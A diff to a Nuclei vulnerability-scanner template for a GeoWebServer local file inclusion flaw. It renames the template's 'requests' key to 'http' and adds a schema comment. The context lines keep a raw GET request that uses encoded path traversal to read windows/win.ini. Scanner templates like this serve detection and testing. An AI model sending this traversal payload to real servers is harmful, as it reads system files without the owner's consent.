@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: geowebserver-lfi2
 
 info:
@@ -8,7 +9,7 @@ info:
   tags: geowebserver,lfi
 
 
-requests:
+http:
   - raw:
       - |
         GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=aaa HTTP/1.1
